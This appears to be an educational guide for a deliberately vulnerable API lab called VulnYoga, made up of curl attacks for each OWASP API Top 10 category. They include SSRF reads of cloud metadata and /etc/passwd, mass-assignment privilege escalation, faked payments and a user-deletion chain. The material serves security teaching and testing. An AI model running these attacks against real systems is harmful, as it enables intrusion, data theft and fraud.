# VulnYoga Attack Examples

This document contains working curl examples to demonstrate each OWASP API Security Top 10 vulnerability in VulnYoga.

⚠️ **WARNING**: These examples are for educational purposes only. Use only in isolated, controlled environments.

## Prerequisites

1. Start VulnYoga: `npm run dev`
2. Ensure all vulnerability flags are enabled (default)
3. Have `jq` installed for JSON parsing: `brew install jq` (macOS) or `apt install jq` (Ubuntu)

## Configuration

**Set your API base URL** (replace with your actual server address):
```bash
# For local development
API_BASE="http://localhost:3000"

# For remote deployment
# API_BASE="http://<your-server-ip-or-domain>:<PORT>"
```

## Setup: Get Authentication Tokens

```bash
# Login as Alice (Customer)
ALICE_TOKEN=$(curl -sX POST $API_BASE/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@demo.local","password":"alice123"}' | jq -r .token)

# Login as Bob (Staff)
BOB_TOKEN=$(curl -sX POST $API_BASE/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@demo.local","password":"bob123"}' | jq -r .token)

# Login as Admin
ADMIN_TOKEN=$(curl -sX POST $API_BASE/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@demo.local","password":"admin123"}' | jq -r .token)

echo "Alice token: $ALICE_TOKEN"
echo "Bob token: $BOB_TOKEN"
echo "Admin token: $ADMIN_TOKEN"
```

## API1: Broken Object Level Authorization (BOLA)

### Attack: Access Another User's Profile
```bash
# Login as Bob, then access Alice's profile (ID 1)
curl -sX GET "$API_BASE/api/v1/users/1" \
  -H "Authorization: Bearer $BOB_TOKEN" | jq .
```

### Attack: Access Another User's Order
```bash
# Login as Bob, then access Alice's order (ID 1)
curl -sX GET "$API_BASE/api/v1/orders/1" \
  -H "Authorization: Bearer $BOB_TOKEN" | jq .
```

**Expected Result**: Bob can access Alice's data without ownership check.

## API2: Broken Authentication

### Attack: Use Token in Query Parameter
```bash
# Use token in query parameter instead of Authorization header
curl -sX GET "$API_BASE/api/v1/users/1?token=$ALICE_TOKEN" | jq .
```

### Attack: Password Reset Without Proof of Ownership
```bash
# Request password reset for any email (no verification)
curl -sX POST $API_BASE/api/v1/auth/reset \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | jq .
```

### Attack: Use Expired Token
```bash
# Create a token that expires in 1 second
EXPIRED_TOKEN=$(curl -sX POST $API_BASE/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@demo.local","password":"alice123"}' | jq -r .token)

# Wait 2 seconds, then use the expired token
sleep 2
curl -sX GET "$API_BASE/api/v1/users/1" \
  -H "Authorization: Bearer $EXPIRED_TOKEN" | jq .
```

**Expected Result**: Expired tokens are still accepted.

## API3: Broken Object Property Level Authorization (BOPLA)

### Attack: Mass Assignment During Registration
```bash
# Register with admin role (should not be allowed)
curl -sX POST $API_BASE/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email":"hacker@demo.local",
    "password":"hacker123",
    "name":"Hacker User",
    "role":"ADMIN"
  }' | jq .
```

### Attack: Update Sensitive Fields
```bash
# Update user with sensitive fields (role, resetToken)
curl -sX PATCH "$API_BASE/api/v1/users/2" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role":"ADMIN",
    "resetToken":"fake-token"
  }' | jq .
```

### Attack: Create Item with Sensitive Data
```bash
# Create item with internal cost and supplier data
curl -sX POST $API_BASE/api/v1/items \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"Hacked Item",
    "description":"Created with mass assignment",
    "price":99.99,
    "costPrice":5.00,
    "supplierEmail":"internal@supplier.com"
  }' | jq .
```

**Expected Result**: Sensitive fields are accepted and stored.

## API4: Unrestricted Resource Consumption

### Attack: Unbounded Search Results
```bash
# Request massive page size
curl -sX GET "$API_BASE/api/v1/items/search?pageSize=100000" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq .
```

### Attack: CPU-Intensive Search
```bash
# Search with wildcard pattern (CPU intensive)
curl -sX GET "$API_BASE/api/v1/items/search?q=%25yoga%25" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq .
```

### Attack: Sleep Attack
```bash
# Request long sleep duration
curl -sX GET "$API_BASE/api/v1/sleep?ms=30000" | jq .
```

**Expected Result**: No limits enforced on resource consumption.

## API5: Broken Function Level Authorization

### Attack: Client-Controlled Role
```bash
# Delete item using client-controlled role header
curl -sX DELETE "$API_BASE/api/v1/items/1" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "X-Role: admin" | jq .
```

### Attack: Access Admin Endpoint
```bash
# Access admin endpoint as regular user
curl -sX GET "$API_BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq .
```

### Attack: Get System Stats
```bash
# Access system stats as regular user
curl -sX GET "$API_BASE/api/v1/admin/stats" \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq .
```

**Expected Result**: Regular users can access admin functions.

## API6: Unrestricted Access to Sensitive Business Flows

### Attack: Ship Before Payment
```bash
# Create an order first
ORDER_ID=$(curl -sX POST "$API_BASE/api/v1/orders" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items":[{"itemId":1,"qty":1}],
    "shippingAddress":"123 Hack St"
  }' | jq -r .id)

# Ship order without payment
curl -sX POST "$API_BASE/api/v1/checkout/ship" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"orderId\":$ORDER_ID}" | jq .
```

### Attack: Coupon Replay Attack
```bash
# Apply same coupon multiple times
curl -sX POST "$API_BASE/api/v1/checkout/apply-coupon" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"orderId\":$ORDER_ID,\"couponCode\":\"HALFPRICE\"}" | jq .

curl -sX POST "$API_BASE/api/v1/checkout/apply-coupon" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"orderId\":$ORDER_ID,\"couponCode\":\"HALFPRICE\"}" | jq .
```

**Expected Result**: Business logic bypasses work.

## API7: Server-Side Request Forgery (SSRF)

### Attack: Access Internal Metadata
```bash
# Access AWS metadata (if running on AWS)
curl -sX GET "$API_BASE/api/v1/image/proxy?url=http://169.254.169.254/latest/meta-data/" | jq .
```

### Attack: Access Local Files
```bash
# Access local files (if file:// protocol allowed)
curl -sX GET "$API_BASE/api/v1/image/proxy?url=file:///etc/passwd" | jq .
```

### Attack: Access Internal Services
```bash
# Access internal services
curl -sX GET "$API_BASE/api/v1/image/proxy?url=$API_BASE/healthz" | jq .
```

**Expected Result**: Internal network access is possible.

## API8: Security Misconfiguration

### Attack: Unauthenticated Data Export
```bash
# Export all items without authentication
curl -sX GET "$API_BASE/api/v1/export/csv" | head -10
```

### Attack: Access Swagger Documentation
```bash
# Access API documentation without authentication
curl -sX GET "$API_BASE/docs" | grep -i "swagger"
```

### Attack: Directory Listing
```bash
# Access directory listing
curl -sX GET "$API_BASE/public" | grep -i "directory"
```

### Attack: Verbose Error Messages
```bash
# Trigger error to see stack trace
curl -sX GET "$API_BASE/api/v1/items/search?pageSize=not-a-number" | jq .
```

**Expected Result**: Sensitive information is exposed.

## API9: Improper Inventory Management

### Attack: Access Legacy Endpoints
```bash
# Access legacy v0 endpoint (no authentication)
curl -sX GET "$API_BASE/api/v0/users/listAll" | jq .
```

### Attack: Access Legacy Orders
```bash
# Access orders via legacy endpoint
curl -sX GET "$API_BASE/api/v0/orders/user/1" | jq .
```

### Attack: Leak Supplier Data
```bash
# Get items with supplier information
curl -sX GET "$API_BASE/api/v0/items/bulk?include=supplier" | jq .
```

### Attack: Manage Others' API Keys
```bash
# List API keys for other users
curl -sX GET "$API_BASE/api/v1/keys/mine?userId=1" \
  -H "Authorization: Bearer $BOB_TOKEN" | jq .

# Create API key for another user
curl -sX POST "$API_BASE/api/v1/keys" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "label":"Hacked Key",
    "userId":1
  }' | jq .
```

**Expected Result**: Legacy endpoints and improper access controls work.

## API10: Unsafe Consumption of APIs

### Attack: Fake Payment Response
```bash
# Create an order
ORDER_ID=$(curl -sX POST "$API_BASE/api/v1/orders" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items":[{"itemId":1,"qty":1}],
    "shippingAddress":"123 Hack St"
  }' | jq -r .id)

# Fake payment with client-controlled data
curl -sX POST "$API_BASE/api/v1/checkout/pay" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"orderId\":$ORDER_ID,
    \"paid\":true,
    \"amount\":1.00,
    \"currency\":\"USD\"
  }" | jq .
```

**Expected Result**: Payment is marked as successful without real payment processing.

## Combined Attack: Privilege Escalation Chain

```bash
# 1. Register as admin (API3)
curl -sX POST $API_BASE/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email":"hacker@demo.local",
    "password":"hacker123",
    "name":"Hacker User",
    "role":"ADMIN"
  }' | jq .

# 2. Login as hacker
HACKER_TOKEN=$(curl -sX POST $API_BASE/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@demo.local","password":"hacker123"}' | jq -r .token)

# 3. Access all users (API5)
curl -sX GET "$API_BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $HACKER_TOKEN" | jq .

# 4. Delete other users
curl -sX DELETE "$API_BASE/api/v1/admin/users/1" \
  -H "Authorization: Bearer $HACKER_TOKEN" | jq .
```

## Defensive Testing

To test the secure mode, set `SAFE_MODE=true` in your environment and run the same attacks. They should all fail with appropriate error messages.

## Monitoring

Check the application logs to see security events being logged:

```bash
# Watch logs in real-time
tail -f logs/combined.log | grep -i "vulnerability\|attack\|security"
```

## Cleanup

```bash
# Stop the application
pkill -f "vulnyoga"

# Remove database
rm -f yogastore.db

# Remove logs
rm -rf logs/
```

## Notes

- All examples use the `$API_BASE` variable defined at the top of this file
- For local development, set `API_BASE="http://localhost:3000"`
- For remote deployments, set `API_BASE="http://<your-server-ip-or-domain>:<PORT>"`
- Tokens are valid for 24 hours by default
- Some attacks may require specific vulnerability flags to be enabled
- The application logs all security events for monitoring
- Use these examples responsibly and only in controlled environments
